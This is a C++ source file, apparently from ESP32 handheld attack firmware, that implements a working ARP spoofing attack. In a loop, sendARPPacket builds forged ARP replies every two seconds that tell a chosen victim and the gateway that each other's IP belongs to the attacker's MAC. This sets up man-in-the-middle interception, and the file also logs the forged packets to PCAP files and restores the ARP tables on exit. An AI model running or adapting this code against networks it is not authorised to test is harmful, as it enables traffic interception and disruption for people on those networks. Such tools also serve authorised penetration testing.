/**
 * @file ARPSpoofer.cpp
 * @brief ARP Spoofer module for every esp-netif
 * @version 0.1
 * @date 2025-05-15
 */

#include "ARPSpoofer.h"
#include "Arduino.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "lwip/pbuf.h"
#include "lwipopts.h"
#include "modules/wifi/scan_hosts.h"
#include <TimeLib.h>
#include <esp_wifi.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <sstream>

ARPSpoofer::ARPSpoofer(
    const Host &host, IPAddress gateway, uint8_t _gatewayMAC[6], uint8_t mac[6], bool _mitm
)
    : mitm(_mitm), pcapHandler(nullptr) {
    memcpy(gatewayMAC, _gatewayMAC, 6);
    memcpy(myMAC, mac, 6);

    // Initialize PCAP handler
    pcapHandler = new NetSniffer();

    setup(host, gateway);
}

ARPSpoofer::~ARPSpoofer() {
    finalizePCAPCapture();
    if (pcapHandler) {
        delete pcapHandler;
        pcapHandler = nullptr;
    }
}

bool ARPSpoofer::initializePCAPCapture() {
    if (!pcapHandler) {
        Serial.println("PCAP handler not initialized!");
        return false;
    }

    // Setup file system through NetSniffer
    if (!pcapHandler->setupFileSystem()) {
        Serial.println("Failed to setup file system for PCAP");
        return false;
    }

    // Create ARP session directory
    FS *fs = pcapHandler->getFileSystem();
    if (!fs->exists("/BrucePCAP")) { fs->mkdir("/BrucePCAP"); }
    if (!fs->exists("/BrucePCAP/ARP_sessions")) { fs->mkdir("/BrucePCAP/ARP_sessions"); }

    // Generate unique filename for ARP session
    static int sessionNumber = 0;
    String filename;
    do {
        filename = "/BrucePCAP/ARP_sessions/ARP_session_" + String(sessionNumber++) + ".pcap";
    } while (fs->exists(filename));

    // Open PCAP file through NetSniffer
    File tempFile = fs->open(filename, FILE_WRITE);
    if (!tempFile) {
        Serial.println("Failed to create ARP PCAP file: " + filename);
        return false;
    }

    // Write PCAP header
    bool headerWritten = pcapHandler->writeHeader(tempFile);
    tempFile.close();

    if (!headerWritten) {
        Serial.println("Failed to write PCAP header");
        return false;
    }

    // Re-open file for logging
    pcapHandler->openFile(*fs);

    Serial.println("ARP PCAP capture initialized: " + filename);
    return true;
}

void ARPSpoofer::finalizePCAPCapture() {
    if (pcapHandler && pcapHandler->isFileOpen()) {
        pcapHandler->closeFile();
        Serial.println("ARP PCAP capture finalized");
    }
}

void ARPSpoofer::setup(const Host &host, IPAddress gateway) {
    // Initialize PCAP capture
    if (!initializePCAPCapture()) { Serial.println("Warning: PCAP capture initialization failed"); }

    // Setup victim and gateway information
    for (int i = 0; i < 4; i++) {
        victimIP[i] = host.ip[i];
        gatewayIP[i] = gateway[i];
    }
    stringToMAC(host.mac.c_str(), victimMAC);

    // Display setup information
    drawMainBorderWithTitle("ARP Spoofing");
    padprintln("");
    padprintln("Single Target Attack.");

    if (mitm) {
        tft.setTextSize(FP);
        Serial.println("MITM mode - Still in development");
    }

    padprintln("Target MAC: " + host.mac);
    padprintln("Target IP: " + ipToString(victimIP));
    padprintln("Gateway MAC: " + macToString(gatewayMAC));
    padprintln("Gateway IP: " + ipToString(gatewayIP));
    padprintln("");
    padprintln("PCAP: " + pcapHandler->getFileSysName());
    padprintln("");
    padprintln("Press Any key to STOP.");

    loop();
}

void ARPSpoofer::loop() {
    unsigned long lastSpoofTime = 0;
    int spoofCount = 0;

    while (!check(AnyKeyPress)) {
        unsigned long currentTime = millis();

        if (currentTime - lastSpoofTime >= 2000) { // Send frames every 2 seconds
            // Send false ARP response to victim (Gateway IP now has our MAC Address)
            sendARPPacket(victimIP, victimMAC, gatewayIP, myMAC);

            // Send false ARP response to Gateway (Victim IP now has our MAC Address)
            sendARPPacket(gatewayIP, gatewayMAC, victimIP, myMAC);

            lastSpoofTime = currentTime;
            spoofCount++;

            // Update display
            tft.drawRightString("Spoofed " + String(spoofCount) + " times", tftWidth - 12, tftHeight - 16, 1);

            Serial.println("ARP spoofing packets sent (count: " + String(spoofCount) + ")");
        }

        yield(); // Allow other tasks to run
    }

    if (mitm) { Serial.println("Promiscuous mode deactivated."); }

    // Restore ARP tables with legitimate information
    padprintln("Restoring ARP tables...");
    sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC);
    sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC);

    Serial.println("ARP tables restored");
    finalizePCAPCapture();
}

void ARPSpoofer::sendARPPacket(
    uint8_t *targetIP, uint8_t *targetMAC, uint8_t *spoofedIP, uint8_t *spoofedMAC
) {
    struct eth_hdr *ethhdr;
    struct etharp_hdr *arphdr;
    struct pbuf *p;
    struct netif *netif;

    // Get network interface
    netif = netif_list;
    if (netif == NULL) {
        Serial.println("No network interface found!");
        return;
    }

    // Allocate pbuf for ARP packet
    p = pbuf_alloc(PBUF_RAW, sizeof(struct eth_hdr) + sizeof(struct etharp_hdr), PBUF_RAM);
    if (p == NULL) {
        Serial.println("Failed to allocate pbuf!");
        return;
    }

    ethhdr = (struct eth_hdr *)p->payload;
    arphdr = (struct etharp_hdr *)((u8_t *)p->payload + SIZEOF_ETH_HDR);

    // Fill Ethernet header
    MEMCPY(&ethhdr->dest, targetMAC, ETH_HWADDR_LEN); // Target MAC (victim or gateway)
    MEMCPY(&ethhdr->src, spoofedMAC, ETH_HWADDR_LEN); // Attacker MAC (ours)
    ethhdr->type = PP_HTONS(ETHTYPE_ARP);

    // Fill ARP header
    arphdr->hwtype = PP_HTONS(1); // Ethernet hardware type
    arphdr->proto = PP_HTONS(ETHTYPE_IP);
    arphdr->hwlen = ETH_HWADDR_LEN;
    arphdr->protolen = sizeof(ip4_addr_t);
    arphdr->opcode = PP_HTONS(ARP_REPLY);

    MEMCPY(&arphdr->shwaddr, spoofedMAC, ETH_HWADDR_LEN);    // Spoofed MAC (gateway or victim)
    MEMCPY(&arphdr->sipaddr, spoofedIP, sizeof(ip4_addr_t)); // Spoofed IP (gateway or victim)
    MEMCPY(&arphdr->dhwaddr, targetMAC, ETH_HWADDR_LEN);     // Real target MAC (victim or gateway)
    MEMCPY(&arphdr->dipaddr, targetIP, sizeof(ip4_addr_t));  // Real target IP (victim or gateway)

    // Send the packet
    if (netif->linkoutput) {
        netif->linkoutput(netif, p);

        // Log packet to PCAP file using NetSniffer
        if (pcapHandler && pcapHandler->isFileOpen()) {
            writePacketToPCAP((uint8_t *)p->payload, p->tot_len);
        }

        Serial.println("ARP packet sent successfully!");
    } else {
        Serial.println("No link output function available!");
    }

    pbuf_free(p);
}

void ARPSpoofer::writePacketToPCAP(uint8_t *packet, uint32_t length) {
    uint32_t timestamp = now();
    uint32_t microseconds = (unsigned int)(micros() - millis() * 1000);

    pcapHandler->newPacketSD(timestamp, microseconds, length, packet);
}
